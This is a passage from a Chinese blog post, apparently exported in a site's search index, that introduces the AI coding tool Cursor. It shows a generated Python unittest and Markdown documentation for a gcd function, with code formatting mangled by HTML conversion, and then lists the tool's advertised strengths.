b)<br>代码测试：你可以在你的代码编辑器中选中你想要测试的代码，然后输入你的测试目标或者条件，然后按下Ctrl+Enter键，Cursor就会为你生成相应的测试用例和测试代码。例如，你可以选中上面的代码，然后输入“测试函数的正确性和性能”，然后按下Ctrl+Enter键，Cursor就会为你生成如下的测试用例和测试代码：</p><p>Python<br>AI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.</p><p>import unittest<br>import timeit</p><p>class TestGcd(unittest.TestCase):</p><h1 id="测试gcd函数的正确性和性能"><a href="#测试gcd函数的正确性和性能" class="headerlink" title="测试gcd函数的正确性和性能"></a>测试gcd函数的正确性和性能</h1><p>def test_correctness(self):</p><h1 id="测试gcd函数的正确性"><a href="#测试gcd函数的正确性" class="headerlink" title="测试gcd函数的正确性"></a>测试gcd函数的正确性</h1><p>self.assertEqual(gcd(12, 18), 6)<br>self.assertEqual(gcd(24, 36), 12)<br>self.assertEqual(gcd(17, 23), 1)</p><p>def test_performance(self):</p><h1 id="测试gcd函数的性能"><a href="#测试gcd函数的性能" class="headerlink" title="测试gcd函数的性能"></a>测试gcd函数的性能</h1><p>t &#x3D; timeit.timeit(“gcd(123456789, 987654321)”, setup&#x3D;”from <strong>main</strong> import gcd”, number&#x3D;1000)<br>print(f”Average time for 1000 calls: {t&#x2F;1000:.6f} seconds”)</p><p>if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:<br>unittest.main()<br>代码文档：你可以在你的代码编辑器中选中你想要文档化的代码，然后输入你的文档目的或者格式，然后按下Ctrl+Enter键，Cursor就会为你生成相应的文档和注释。例如，你可以选中上面的代码，然后输入“生成Markdown格式的文档”，然后按下Ctrl+Enter键，Cursor就会为你生成如下的文档和注释：</p><p>Python<br>AI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.</p><h1 id="gcd函数"><a href="#gcd函数" class="headerlink" title="gcd函数"></a>gcd函数</h1><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>gcd函数用于计算两个数的最大公约数。</p><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><ul><li>a: 第一个数，必须是整数。</li><li>b: 第二个数，必须是整数。</li></ul><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>返回两个数的最大公约数，是一个整数。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>gcd(<span class="number">12</span>, <span class="number">18</span>)</span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>gcd(<span class="number">24</span>, <span class="number">36</span>)</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>gcd(<span class="number">17</span>, <span class="number">23</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>gcd函数使用了递归的方式实现，如果两个数较大，可能会导致栈溢出的风险。可以考虑使用循环的方式改进。</p><p>Cursor的优势和特点</p><p>Cursor的优势和特点有：</p><ul><li>基于人工智能：Cursor使用了最先进的自然语言处理技术，能够理解你的编程意图和需求，并根据你的上下文和目标，生成符合你期望的代码。Cursor不仅可以生成代码，还可以检测和修复代码中的错误，提高代码的质量和效率。Cursor还可以根据你的代码生成相应的文档、注释和测试用例，让你的编程过程更加轻松和高效。</li><li>基于文本：Cursor使用了基于文本的交互方式，你只需要通过自然语言或者部分代码来引导Cursor为你生成、修改、测试或者文档化你的代码。你不需要学习任何复杂的语法或者命令，只需要用你熟悉的语言来表达你的编程想法和需求，Cursor就可以为你完成你的编程任务。</li><li>基于插件：Cursor使用了基于插件的集成方式，你只需要在你的编程环境中安装Cursor的插件，然后就可以在你的代码编辑器中直接使用Cursor的功能。你不需要切换到任何其他的平台或者工具，只需要在你的代码编辑器中按下Ctrl+Enter键，Cursor就可以为你生成、修改、测试或者文档化你的代码。</li></ul><p><img src="/./2024/05/26/%E5%86%99%E4%BB%A3%E7%A0%81%E7%A5%9E%E5%99%A8/2.png" alt="搜索页"></p><p>Cursor的未来展望</p><p>Cursor是一个基于人工智能的编程辅助工具，它可以帮助你快速地生成、修改、优化和测试代码。Cursor使用了最先进的自然语言</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发神器 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
